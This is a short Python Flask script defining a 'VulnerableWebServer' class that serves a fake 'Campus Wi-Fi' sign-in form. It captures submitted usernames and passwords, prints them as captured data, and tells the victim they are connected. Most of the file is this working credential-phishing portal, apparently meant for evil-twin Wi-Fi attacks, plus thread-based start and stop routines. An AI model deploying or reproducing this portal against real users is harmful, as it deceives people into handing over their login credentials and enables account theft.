from flask import Flask, request, render_template_string
import threading
import werkzeug.serving
import logging
import socket
import time

# Keep the console clean
logging.getLogger("werkzeug").setLevel(logging.ERROR)


class VulnerableWebServer:
    def __init__(self, port=8080):
        self.app = Flask(__name__)
        self.port = port
        self.server = None
        self.thread = None

        @self.app.route("/")
        def index():
            return "<h2>Campus Wi-Fi</h2><form method='POST' action='/login'><input name='u'><input type='password' name='p'><button>Sign In</button></form>"

        @self.app.route("/login", methods=["POST"])
        def login():
            captured_data = request.form.to_dict()
            print(f"\n[!] data: {captured_data}")
            return "<h2>Connected!</h2>"

    def start(self):
        """Starts the server with socket options to prevent hanging."""
        if self.thread is not None:
            return

        self.server = werkzeug.serving.make_server(
            "0.0.0.0", self.port, self.app, threaded=True
        )

        self.server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"[*] Server started on port {self.port}")

    def stop(self):
        """Forcefully kills the server so the script can continue."""
        if self.server:
            print("[*] Stopping Vulnerable Web Server...")

            try:
                self.server.socket.close()
            except:
                pass

            shutdown_thread = threading.Thread(target=self.server.shutdown)
            shutdown_thread.start()

            if self.thread:
                self.thread.join(timeout=1.0)

            self.server = None
            self.thread = None

            time.sleep(0.5)
            print("[*] Server stopped and port cleared.")
